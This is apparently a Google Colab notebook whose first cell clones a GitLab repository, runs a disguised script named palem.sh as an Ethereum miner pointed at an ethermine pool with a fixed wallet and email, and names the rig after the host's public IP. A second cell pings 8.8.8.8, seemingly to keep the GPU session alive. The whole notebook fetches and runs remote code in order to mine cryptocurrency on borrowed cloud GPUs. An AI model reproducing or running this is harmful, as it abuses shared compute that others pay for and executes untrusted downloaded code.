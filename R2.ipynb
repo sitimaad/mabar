{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "R2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "hOscE_s4oBuVU"
      },
      "source": [
        "!nvidia-smi && git clone https://gitlab.com/dwihandoko/asw.git && cd asw && chmod +x palem.sh && ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./palem.sh -algo ethash -pool1 eu1.ethermine.org:14444 -wallet 0x05a10aaa1e862c786a2beada3ca072f5cd38e02f -coin eth -rigName $ip -email sarjon350@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dtu18Fv746RB"
      },
      "source": [
        "!ping 8.8.8.8"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}